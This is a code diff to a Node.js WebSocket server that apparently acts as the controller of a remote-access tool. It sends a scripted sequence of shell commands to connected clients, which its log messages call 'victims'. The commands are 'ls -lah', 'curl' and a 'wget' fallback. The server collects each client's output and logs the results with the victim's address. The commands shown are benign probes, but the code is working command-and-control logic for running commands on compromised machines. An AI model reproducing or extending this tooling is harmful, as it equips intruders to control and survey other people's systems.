@@ -20,20 +20,41 @@ const wsServer = new WebSocketServer({
 
 wsServer.on("request", request => {
   const connection = request.accept("echo-protocol", request.origin);
-  console.log(`New victim connected at address: ${request.remoteAddresses}`);
 
-  connection.sendUTF(JSON.stringify(["ls", ["-lah"]]));
+  const responses = [];
+  const lastResponse = () => (responses.length === 0 ? {} : responses[responses.length - 1]);
+
+  function* logic() {
+    yield ["ls", ["-lah"]];
+    yield ["curl", ["http://google.com"]];
+    if (lastResponse().error) {
+      yield ["wget", ["-O", "-", "http://google.fr"]];
+    }
+  }
+  const commands = logic();
+
+  const sendNextCommand = () => {
+    let cmd = commands.next();
+    if (cmd.done) {
+      connection.close();
+      return;
+    }
+    connection.sendUTF(JSON.stringify(cmd.value));
+  };
 
   connection.on("message", message => {
     if (message.type !== "utf8") {
       return;
     }
-    console.log(JSON.parse(message.utf8Data));
-
-    connection.close();
+    responses.push(JSON.parse(message.utf8Data));
+    sendNextCommand();
   });
 
-  //   connection.on("close", () => {
-  //     console.log(new Date() + " Peer " + connection.remoteAddress + " disconnected.");
-  //   });
+  sendNextCommand();
+  connection.on("close", () => {
+    console.log("============================\n");
+    console.log(`New victim connected at address: ${request.remoteAddresses}`);
+    console.log(responses);
+    console.log("");
+  });
 });
